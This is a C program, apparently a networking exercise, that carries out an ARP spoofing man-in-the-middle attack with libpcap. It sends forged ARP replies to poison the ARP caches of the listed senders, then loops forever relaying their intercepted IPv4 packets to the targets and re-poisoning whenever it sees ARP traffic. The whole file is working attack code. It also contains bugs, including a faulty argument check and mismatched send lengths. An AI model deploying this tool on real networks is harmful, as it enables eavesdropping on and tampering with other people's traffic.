#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <stdlib.h>
#include "parse.h"
#include "function.h"

const u_char *rep;

int main(int argc, char * argv[]){

    if((argc < 3) && (argc % 2 != 0)){
        usage();
        exit(1);
    }

    // Create Session
    int session_num = (argc - 2) / 2;
    Session * session = (Session *)malloc(sizeof(Session) * session_num);
    int n = 0;
    for(int i = 0; i < session_num; i++){
        session[i].sender_ip = inet_addr(argv[2 + n]);
        session[i].target_ip = inet_addr(argv[3 + n]);
        n += 2;
    }

    char* dev = argv[1]; //network interface name
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    struct pcap_pkthdr* header;
    uint32_t attacker_ip;
    uint8_t attacker_mac[6];

    if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    /* 1. Get Attacker's IP and MAC address */
    attacker_ip = getAttackerIP(argv[1]);
    getAttackerMAC(argv[1], attacker_mac);

    /* 2. Find sender's MAC and target's MAC using ARP request */
    find_MAC(handle, header, session_num, rep, attacker_mac, attacker_ip, session);

    /* 3. Make spoofing packet */
    unsigned char ** arp_spoofed_pkt = (unsigned char **)malloc(sizeof(unsigned char *)*session_num);

    for(int i = 0; i < session_num; i++){
        arp_spoofed_pkt[i] = (unsigned char *)malloc(sizeof(unsigned char) * 50);
        memset(arp_spoofed_pkt[i], 0, 50);
        ARP_Packet * arp_pkt = (ARP_Packet *)malloc(sizeof(ARP_Packet));
        make_arp_packet(session[i].sender_mac, attacker_mac, 2, session[i].target_ip, session[i].sender_ip, arp_pkt);
        memcpy(arp_spoofed_pkt[i], arp_pkt, sizeof(*arp_pkt));
    }
    for(int i = 0; i < session_num; i++){
         if(pcap_sendpacket(handle, arp_spoofed_pkt[i], sizeof(unsigned char)*50)!=0){
            printf("[-] Can't send first spoofed pkt\n");
            exit(0);
        }else printf("[+] Success to send 1st spoofed pkt %d\n", i+1);               
    }

    /* 4. Attack */
    const u_char * rep;
    Packet * pkt;
    ARP_Packet * arp_pkt;

    while(1){
        pcap_next_ex(handle, &header, &rep);
        pkt = (Packet *)rep;
        arp_pkt = (ARP_Packet *)rep;

        for(int i = 0 ; i < session_num; i++){
            // relay check
            if((ntohs(pkt->eth.ether_type) == 0x0800) && check_relay(&session[i], attacker_ip, pkt)){
                // TODO: rep data must be changed
                memcpy(pkt->eth.src_MAC, attacker_mac, sizeof(uint8_t)*6);
                memcpy(pkt->eth.dst_MAC, session[i].target_mac, sizeof(uint8_t)*6);
                // TODO: send changed rep
                if(pcap_sendpacket(handle, rep, header->len)!=0) {
                    printf("[-] Relay failed\n");
                    exit(1);
                }
                printf("[+] Success relay\n");
                break;
            }
            // arp check
            else if((ntohs(arp_pkt->eth.ether_type) == 0x0806) && check_arp_attack(&session[i], arp_pkt)){
                if(pcap_sendpacket(handle, arp_spoofed_pkt[i], header->len)!=0) {
                    printf("[-] Send spooed pkt failed\n");
                    exit(1);
                }printf("[+] Success sending spoofed pkt\n");
                break;
            }
        }
    }


    return 0;

}
